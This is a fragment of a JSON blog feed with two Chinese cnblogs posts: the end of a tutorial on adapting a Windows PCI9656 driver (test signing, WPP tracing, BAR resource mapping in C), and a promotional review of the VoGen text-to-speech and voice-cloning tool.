id=\"支持实验签名\">支持实验签名</h3>\n<p>64位系统必须得有数字签名才能够安装驱动，VS2017+WDK的编译环境可以自动加测试签名，所以只要将目标机开启TestSigning即可，这部分可以自行百度，或者直接使用签名工具“Windows 64Signer V1.2.exe”，它除了给驱动签名，还能开启TestSigning。</p>\n<h3 id=\"支持内核信息输出\">支持内核信息输出</h3>\n<p>debugview是可以显示内核信息的，但是示例驱动中使用WPP（Windows Software Trace Preprocessor）方式跟踪代码流程，需要进行一定的转换才能显示在debugview中，所以暂时先不使用debugview显示。</p>\n<p>在Windows11下比较简单就可以使用工具显示WPP的输出信息，直接将WDK安装目录的可执行文件夹复制到目标机器即可，我的目录是：<br />\nC:\\Program Files (x86)\\Windows Kits\\10\\Tools\\x64<br />\n将x64目录整个复制到目标机，然后以管理员身份运行运行traceview.exe<br />\n初次运行需要File-\"Create New Log Session\"-\"PDB（Debug Information） File\"<br />\n选择编译目录的Pci9x5x.pdb</p>\n<p>然后就能看到在驱动中输出的信息了。</p>\n<h2 id=\"寄存器定义\">寄存器定义</h2>\n<p>PCI9656与PCI9054在基地址、中断以及DMA操作方面的定义完全一样，只有其它一些没用到的功能定义不同，所以稍加改动就可以使用示例程序中的寄存器头文件。</p>\n<h2 id=\"分配资源\">分配资源</h2>\n<p>PLxPrepareHardware函数中分配资源<br />\n对于PCI总线，驱动使用BAR这个概念来分配寄存器资源，BAR是\"Base Address Register\"的缩写，也就是基地址寄存器，32位PCI总线最多6个BAR，根据找到顺序的不同，从BAR0~BAR5。</p>\n<h3 id=\"老驱动中9054分配资源操作\">老驱动中9054分配资源操作：</h3>\n<p>按照资源序号：</p>\n<ul>\n<li>BAR3对应本地译码地址，读写操作FPGA\n<ul>\n<li>应用层读写IO使用</li>\n</ul>\n</li>\n<li>BAR2对应本地译码地址，读写操作FPGA\n<ul>\n<li>内核操作使用</li>\n</ul>\n</li>\n<li>BAR1对应PCI9054地址，读写操作9054</li>\n</ul>\n<p>不知道为何老驱动使用了两个BAR来操作相同的本地总线，新驱动应该使用一个即可。</p>\n<h3 id=\"新驱动中资源分配操作\">新驱动中资源分配操作：</h3>\n<p>下面是PCI9656开发板的资源分配：</p>\n<ul>\n<li>找到内存方式且长度对应0x200，则对应BAR0，地址映射给Regs，直接使用结构体内成员来操作寄存器。</li>\n<li>找到IO方式且长度大于或者等于0x100，则对应BAR1，后续并没有处理这个资源。</li>\n<li>第一次找到内存方式且长度对应0x20000，则对应BAR2，后面映射地址给SRAMBase，但是也没有用到这个地址。</li>\n<li>第二次找到内存方式且长度对应0x20000，则对应BAR3，实际上后面没有处理这个资源</li>\n</ul>\n<p>对于老产品，总的资源数量有9个，分配情况如下</p>\n<ul>\n<li>0 内存资源，长度=256（BAR0）</li>\n<li>1 129号资源，设备私有资源，应该用不到</li>\n<li>2 IO资源，长度256，PCI9054地址（BAR1）</li>\n<li>3 129号资源，设备私有资源，应该用不到</li>\n<li>4 内存资源，长度131,072（0x20000），这个应该是最早9054开发板的资源分配信息，老产品保留了这个设置，实际应该对应本地地址，操作FPGA。（BAR2）</li>\n<li>5 129号资源，设备私有资源，应该用不到</li>\n<li>6 IO资源，长度256，本地地址，操作FPGA（BAR3）</li>\n<li>7 129号资源，设备私有资源，应该用不到</li>\n<li>8 中断资源，这个以后再处理。<br />\n之前无法确定哪个资源对应本地IO，因此需要测试52地址是否能返回0x3100来判断，如果返回0x3100则说明是本地IO<br />\n经过测试后，6号资源（BAR2）对应本地寄存器，2号资源（BAR1）对应PCI9054寄存器。他们都是IO资源，可以直接使用READ_PORT_ULONG和WRITE_PORT_ULONG进行读写操作。内存资源需要使用“LocalMmMapIoSpace”函数转换后，才能使用WRITE_REGISTER_ULONG和READ_REGISTER_ULONG操作。个人感觉IO资源操作更方便，所以所有寄存器操作均使用IO资源。</li>\n</ul>\n<p>仿照示例驱动，先找到的IO资源是PCI9054地址，后找到的IO资源是本地资源。修改后的代码如下：</p>\n<pre><code class=\"language-c\">case CmResourceTypePort:\n//分配IO资源\n  bar = NULL;\n\n  if (!foundLocalPort &amp;&amp; !found9054Port &amp;&amp;\n      desc-&gt;u.Port.Length == 0x100) {\n        found9054Port = TRUE;\n        bar = \"BAR1-9054\";\n        DevExt-&gt;Regs = (PPCI9656_REGS)UlongToPtr(desc-&gt;u.Port.Start.QuadPart);\n        DevExt-&gt;RegsLength = regsLength;\n      }\n      else if (!foundLocalPort &amp;&amp; \n                desc-&gt;u.Port.Length == 0x100) {\n        foundLocalPort = TRUE;\n        bar = \"BAR3-FPGA\";\n        DevExt-&gt;addrLocal = (PUCHAR)UlongToPtr(desc-&gt;u.Port.Start.QuadPart);\n        DevExt-&gt;localLength = desc-&gt;u.Port.Length;\n      }\n\n      TraceEvents(TRACE_LEVEL_INFORMATION, DBG_PNP,\n                  \" - Port   Resource [%08I64X-%08I64X], %s, i:%d length:%d\",\n                    desc-&gt;u.Port.Start.QuadPart,\n                    desc-&gt;u.Port.Start.QuadPart +\n                    desc-&gt;u.Port.Length,\n                    (bar) ? bar : \"&lt;unrecognized&gt;\",\n                    i,\n                    desc-&gt;u.Port.Length);\nbreak;\n</code></pre>\n<p>至此，资源分配部分代码完成，后续要修改其它具体操作。</p>\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-01-16 17:06</span>&nbsp;\n<a href=\"https://www.cnblogs.com/haohaoganhuo\">自由的好好干活</a>&nbsp;\n阅读(<span id=\"post_view_count\">0</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "深度解析 VoGen：2026 年最强免费 AI 语音合成与情感克隆技术方案",
      "link": "https://www.cnblogs.com/jacklu/p/19492952",
      "published": "",
      "description": "<div class=\"postTitle\">\n            <h1><a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/jacklu/p/19492952\" id=\"cb_post_title_url\" title=\"发布于 2026-01-16 16:47\">\n    <span>深度解析 VoGen：2026 年最强免费 AI 语音合成与情感克隆技术方案</span>\n    \n\n</a>\n</h1>\n        </div>\n        <div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<p>最近发现了一个超实用的AI语音工具——VoGen. Vogen是一款提供文本转语音和高保真声音克隆的免费在线 AI 工具。</p>\n<p><img alt=\"www.vogen\" class=\"lazyload\" /></p>\n<p>访问入口：<a href=\"https://vogen.app\" rel=\"noopener nofollow\" target=\"_blank\">https://vogen.app</a></p>\n<h2 id=\"这是什么\">这是什么?</h2>\n<p>VoGen 是一款提供文本转语音和高保真声音克隆的免费在线 AI 工具。简单来说,它能做两件事:</p>\n<ul>\n<li>文字转语音:输入文字,生成自然流畅的语音</li>\n<li>声音克隆:上传音频样本,复刻出几乎以假乱真的声音</li>\n</ul>\n<p>最让人惊喜的是,它不仅支持中英双语,还能控制情绪表达——同一句话可以用高兴、愤怒、悲伤或平静的语气说出来。</p>\n<h2 id=\"谁会需要它\">谁会需要它?</h2>\n<p>内容创作者可能是最大的受益群体。短剧制作者、广告、视频博主们常常面临录音繁琐、成本高昂的问题。有了VoGen,他们可以:节省大量录音时间；创建一个稳定一致的\"品牌声音\"；轻松将内容翻译成多种语言并配上本地化配音。</p>\n<p>游戏开发者尤其是独立开发者和小团队,会发现这是个性价比极高的解决方案。游戏中往往需要为众多NPC角色配音,传统方式既耗时又烧钱。VoGen可以:快速生成大量多样化的角色语音。在开发早期阶段用AI语音做测试,避免过早投入真人配音成本为每个角色定制独特的声音特征</p>\n<p>此外,有声读物出版商、需要制作培训视频的企业、甚至普通用户想玩点有趣的语音创作,都能从中找到适合自己的使用场景。</p>\n<h2 id=\"好用吗\">好用吗？</h2>\n<p>从产品页面的展示来看,VoGen有几个明显优势:<br />\n超高保真度克隆，页面上展示了从特朗普、马斯克等真实人物,到《生活大爆炸》Sheldon、哪吒、孙悟空、灰太狼等虚拟角色的语音克隆示例。这种跨越真人与虚拟角色的能力,证明了其技术的通用性和成熟度。</p>\n<p>多情绪表达，这是许多竞品缺失的功能。同一个克隆声音可以表达不同情绪,这对于需要生动表现力的内容创作至关重要——想象一下游戏角色在不同剧情下的情感变化,或者有声书中角色的喜怒哀乐。</p>\n<h2 id=\"需要付费么\">需要付费么？</h2>\n<p>从界面来看,VoGen把复杂的AI技术包装得非常简洁。主界面就是一个文本输入框、语音选择和情绪控制,没有多余的设置项。常见问题部分提到了对音频样本的要求、数据安全等用户关心的问题,说明产品团队对用户体验的重视。</p>\n<p>值得一提的是,网站明确标注了\"免费开始使用\"(Get Started Free),降低了尝试门槛。</p>\n<h2 id=\"值得尝试吗\">值得尝试吗?</h2>\n<p>如果你属于以下任一情况,VoGen值得花几分钟试试:</p>\n<p>经常需要制作配音内容但预算有限<br />\n想为项目创建独特的声音IP<br />\n需要快速将内容本地化到不同语言<br />\n纯粹对AI语音技术好奇</p>\n<p>页面上的演示音频可以点击试听,建议先听听效果再决定。毕竟语音合成这种东西,听到的才是真实的。</p>\n\n</div>\n<div class=\"clear\"></div>\n\n        <div class=\"postDesc\">posted on \n<span id=\"post-date\">2026-01-16 16:47</span>&nbsp;\n<a href=\"https://www.cnblogs.com/jacklu\">AI产品观察</a>&nbsp;\n阅读(<span id=\"post_view_count\">0</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    }
  ]
}